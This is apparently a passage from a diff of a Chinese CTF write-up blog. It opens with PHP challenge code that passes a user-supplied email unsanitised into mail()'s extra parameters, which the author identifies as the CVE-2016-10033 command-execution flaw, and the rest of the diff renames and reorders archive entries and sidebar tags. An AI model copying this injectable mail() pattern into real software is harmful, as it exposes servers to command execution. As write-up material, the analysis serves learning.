class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) ? trim($_POST[<span class="string">'email'</span>]) : <span class="string">''</span>;</span><br><span class="line">    $title = <span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) ? trim($_POST[<span class="string">'title'</span>]) : <span class="string">''</span>;</span><br><span class="line">    $content = <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) ? trim($_POST[<span class="string">'content'</span>]) : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (chkEmail($email) &amp;&amp; chkTitle($title) &amp;&amp; chkContent($content)) &#123;</span><br><span class="line">        $to = <span class="string">'ambulong@vulnspy.com'</span>;</span><br><span class="line">        $subject = <span class="string">"收到来自 &#123;$email&#125; 的留言"</span>;</span><br><span class="line">        $msg = <span class="string">"&#123;$title&#125;\n&#123;$content&#125;\nFrom: &#123;$email&#125;"</span>;</span><br><span class="line">        $headers = <span class="string">'From: '</span> . $email . <span class="string">"\r\n"</span> . <span class="string">'Reply-To: '</span> . $email . <span class="string">"\r\n"</span> . <span class="string">'X-Mailer: PHP/'</span> . phpversion();</span><br><span class="line">        $options = sprintf(<span class="string">'-f%s'</span>, $email);</span><br><span class="line">        <span class="keyword">if</span> (mail($to, $subject, $msg, $headers, $options)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"留言成功"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"留言失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>其中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail($to, $subject, $msg, $headers, $options)</span><br></pre></td></tr></table></figure></p>
 <p>正是经典的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-10033</span><br><span class="line">PHPMailer 命令执行漏洞</span><br></pre></td></tr></table></figure></p>
 <p>给出一篇分析链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.csdn.net/wyvbboy/article/details/53969278</span><br></pre></td></tr></table></figure></p>
@@ -4380,6 +4380,34 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 214
@@ -4395,6 +4423,11 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href= "/2020/06/21/2019-TMCTF-Final-Hack-Server/" >2019 TMCTF Final & Hack Server</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4592,7 +4625,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/Pwnhub-Always-be-with-U-Writeup/" >Pwnhub-Always be with U-Writeup</a>
+            <span class="archive-post-date">03/29</span><a class="archive-post-title" href= "/2019/03/29/Pwnhub-Always-be-with-U-Writeup/" >2019 Pwnhub-Always be with U-Writeup</a>
         </li>
     
     
@@ -4607,12 +4640,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-2-pcrewaf/" >2018 Code Breaking(2) & pcrewaf</a>
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2019/03/10/2018-Code-Breaking-1-function/" >2018 Code Breaking(1) & function</a>
         </li>
     
     
@@ -4632,12 +4665,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2019/02/24/2019安恒杯-2月月赛Writeup/" >2019安恒杯-2月月赛Writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2019/02/22/2019-Hgame-Week4-Crypto-MixedRSA-Easy/" >2019-Hgame-Week4-Crypto&MixedRSA_Easy</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2019/02/24/2019安恒杯-2月月赛Writeup/" >2019 安恒杯 2月月赛 Writeup</a>
         </li>
     
     
@@ -4647,32 +4675,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2019/02/19/2019-Hgame-Week4-Crypto&Sign_in_SemiHard/" >2019-Hgame-Week4-Crypto&Sign_in_SemiHard</a>
+            <span class="archive-post-date">02/19</span><a class="archive-post-title" href= "/2019/02/19/2019-Hgame-Week4-Crypto&Sign_in_SemiHard/" >2019 Hgame Week4 Crypto&Sign_in_SemiHard</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2019/02/18/2019-Hgame-Web-Week4/" >2019-Hgame-Web-Week4</a>
+            <span class="archive-post-date">02/18</span><a class="archive-post-title" href= "/2019/02/18/2019-Hgame-Web-Week4/" >2019 Hgame Web Week4 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2019/02/10/2019-Hgame-Web&Crypto-Week3/" >2019-Hgame-Web&Crypto-Week3</a>
+            <span class="archive-post-date">02/10</span><a class="archive-post-title" href= "/2019/02/10/2019-Hgame-Web&Crypto-Week3/" >2019 Hgame Web&Crypto Week3 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/2019-Hgame-Web-Week2/" >2019-Hgame-Web-Week2</a>
+            <span class="archive-post-date">02/05</span><a class="archive-post-title" href= "/2019/02/05/2019-Hgame-Web-Week2/" >2019 Hgame Web Week2 Writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019-Hgame-Web-Week1/" >2019-Hgame-Web-Week1</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019-Hgame-Web-Week1/" >2019 Hgame Web Week1</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019安恒1月月赛Writeip/" >2019安恒1月月赛Writeip</a>
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2019/01/25/2019安恒1月月赛Writeip/" >2019 安恒杯 1月月赛 Writeup</a>
         </li>
     
     
@@ -4706,7 +4734,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/2018SWPUCTF-Web/" >2018SWPUCTF-Web</a>
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2018/12/17/2018SWPUCTF-Web/" >2018 SWPUCTF Web</a>
         </li>
     
     
@@ -4716,7 +4744,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2018/11/24/2018安恒杯11月月赛writeup/" >2018安恒杯11月月赛writeup</a>
+            <span class="archive-post-date">11/24</span><a class="archive-post-title" href= "/2018/11/24/2018安恒杯11月月赛writeup/" >2018 安恒杯 11月月赛writeup</a>
         </li>
     
     
@@ -4726,12 +4754,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/2018-Xctf Final&LCTF-Bestphp/" >2018-Xctf Final&LCTF-Bestphp</a>
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2018/11/17/2018-Xctf Final&LCTF-Bestphp/" >2018 Xctf Final LCTF-Bestphp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/EIS-2018-web/" >EIS-2018-web</a>
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/EIS-2018-web/" >2018 EIS web</a>
         </li>
     
     
@@ -4746,7 +4774,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/2018上海大学生信息安全竞赛-web/" >2018上海大学生信息安全竞赛-web</a>
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2018/11/04/2018上海大学生信息安全竞赛-web/" >2018 上海大学生信息安全竞赛 web</a>
         </li>
     
     
@@ -4756,12 +4784,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/2018护网杯-web-writeup/" >2018护网杯-web-writeup</a>
+            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/2018护网杯-web-writeup/" >2018 护网杯 web writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2018/09/24/2018安恒杯-9月月赛Writeup/" >2018安恒杯-9月月赛Writeup</a>
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href= "/2018/09/24/2018安恒杯-9月月赛Writeup/" >2018安恒杯 9月月赛Writeup</a>
         </li>
     
     
@@ -4791,7 +4819,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/2018安恒8月赛Writeup/" >2018安恒8月赛Writeup</a>
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/2018安恒8月赛Writeup/" >2018 安恒8月赛 Writeup</a>
         </li>
     
     
@@ -4816,7 +4844,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2018/08/20/2018WhiteHat-writeup/" >2018WhiteHat-writeup</a>
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2018/08/20/2018WhiteHat-writeup/" >2018 WhiteHat writeup</a>
         </li>
     
     
@@ -4836,7 +4864,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >2018 RealWorld Web Writeup</a>
         </li>
     
     
@@ -4871,17 +4899,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >ISITDTU CTF-Web</a>
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >2018 ISITDTU CTF-Web</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >2018 MeePwn-Web-复现</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客-Web补题/" >巅峰极客-Web补题</a>
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客-Web补题/" >2018 巅峰极客-Web补题</a>
         </li>
     
     
@@ -4926,17 +4954,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/2018-6-1信息安全铁人三项赛数据赛题解/" >2018.6.1信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/2018-6-1信息安全铁人三项赛数据赛题解/" >2018.6.1 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2018.5.5信息安全铁人三项赛数据赛题解</a>
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2018.5.5 信息安全铁人三项赛数据赛题解</a>
         </li>
     
     
@@ -4971,7 +4999,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >DDCTF-bitcoin-51%Attack</a>
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >2018 DDCTF-bitcoin-51%Attack</a>
         </li>
     
     
@@ -5001,17 +5029,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >0ctf-ezdoor</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >2018 0ctf-ezdoor</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >0ctf-login me</a>
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2018/04/09/0ctf-login-me/" >2018 0ctf-login me</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >pwnhub time injection带来的新思路</a>
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >2018 pwnhub time injection带来的新思路</a>
         </li>
     
     
@@ -5111,12 +5139,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018安恒一月月赛部分题解</a>
+            <span class="archive-post-date">01/22</span><a class="archive-post-title" href= "/2018/01/22/2018安恒一月月赛部分题解/" >2018 安恒一月月赛部分题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
+            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2018/01/18/XCTF-赛博地球杯工业互联网安全大赛web部分题解/" >2018 XCTF-赛博地球杯工业互联网安全大赛web部分题解</a>
         </li>
     
     
@@ -5165,12 +5193,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >安恒12月赛之VSCMS审计</a>
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2017/12/19/安恒12月赛之VSCMS审计/" >2017 安恒12月赛之VSCMS审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >安恒杯-12月月赛</a>
+            <span class="archive-post-date">12/17</span><a class="archive-post-title" href= "/2017/12/17/安恒杯-12月月赛/" >2017 安恒杯-12月月赛</a>
         </li>
     
     
@@ -5180,7 +5208,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >pwnhub成功就是要梭哈之学习记录</a>
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/2017/12/14/pwnhub成功就是要梭哈之学习记录/" >2017 pwnhub成功就是要梭哈之学习记录</a>
         </li>
     
     
@@ -5210,12 +5238,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >湖湘杯复赛web400</a>
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2017/11/27/湖湘杯复赛web400/" >2017 湖湘杯复赛web400</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >湖湘杯复赛web题解</a>
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2017/11/25/湖湘杯复赛web题解/" >2017 湖湘杯复赛web题解</a>
         </li>
     
     
@@ -5235,32 +5263,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >hctf的3道web题题解</a>
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2017/11/12/hctf的3道web题题解/" >2017 hctf的3道web题题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >上海赛的RSA研究</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海赛的RSA研究/" >2017 上海赛的RSA研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >上海线上赛web题解</a>
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/上海线上赛web题解/" >2017 上海线上赛web题解</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >XDCTF线下赛经历及感悟</a>
+            <span class="archive-post-date">10/30</span><a class="archive-post-title" href= "/2017/10/30/XDCTF线下赛经历及感悟/" >2017 XDCTF线下赛经历及感悟</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >安恒总决赛的一道代码审计</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2017/10/29/安恒总决赛的一道代码审计/" >2017 安恒总决赛的一道代码审计</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >geekgame部分web题解</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href= "/2017/10/28/geekgame部分题解/" >2017 geekgame部分web题解</a>
         </li>
     
     
@@ -5270,7 +5298,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >BDCTF第一轮初赛web题解</a>
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2017/10/23/BDCTF第一轮初赛web题解/" >2017 BDCTF第一轮初赛web题解</a>
         </li>
     
     
@@ -5315,7 +5343,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >Xman线下赛源码审计</a>
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2017/08/21/Xman线下赛源码审计/" >2017 Xman线下赛源码审计</a>
         </li>
     
     
@@ -5502,61 +5530,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
-    
-        <span class="sidebar-tag-name" data-tags="Flow-Analysis"><span class="iconfont-archer">&#xe606;</span>Flow-Analysis</span>
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
         <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
     
-        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
-    
-        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
-    
-        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
-    
-        <span class="sidebar-tag-name" data-tags="study"><span class="iconfont-archer">&#xe606;</span>study</span>
-    
-        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
-    
-        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
-    
-        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
-    
-        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
-    
-        <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
-    
-        <span class="sidebar-tag-name" data-tags="other"><span class="iconfont-archer">&#xe606;</span>other</span>
-    
-        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
-    
-        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
-    
-        <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
-    
-        <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
-        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
-    
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
-    
-        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
-    
-        <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
-    
-        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
-    
-        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
-    
-        <span class="sidebar-tag-name" data-tags="des"><span class="iconfont-archer">&#xe606;</span>des</span>
+        <span class="sidebar-tag-name" data-tags="others"><span class="iconfont-archer">&#xe606;</span>others</span>
     
         <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
+        <span class="sidebar-tag-name" data-tags="paper"><span class="iconfont-archer">&#xe606;</span>paper</span>
+    
+        <span class="sidebar-tag-name" data-tags="ml"><span class="iconfont-archer">&#xe606;</span>ml</span>
+    
+        <span class="sidebar-tag-name" data-tags="IOT"><span class="iconfont-archer">&#xe606;</span>IOT</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -5595,19 +5581,13 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
     
-        <span class="sidebar-category-name" data-categories="Flow-Analysis"><span class="iconfont-archer">&#xe60a;</span>Flow-Analysis</span>
-    
         <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
-    
-        <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
     
         <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
     
+        <span class="sidebar-category-name" data-categories="others"><span class="iconfont-archer">&#xe60a;</span>others</span>
+    
         <span class="sidebar-category-name" data-categories="paper"><span class="iconfont-archer">&#xe60a;</span>paper</span>
-    
-        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
-    
-        <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
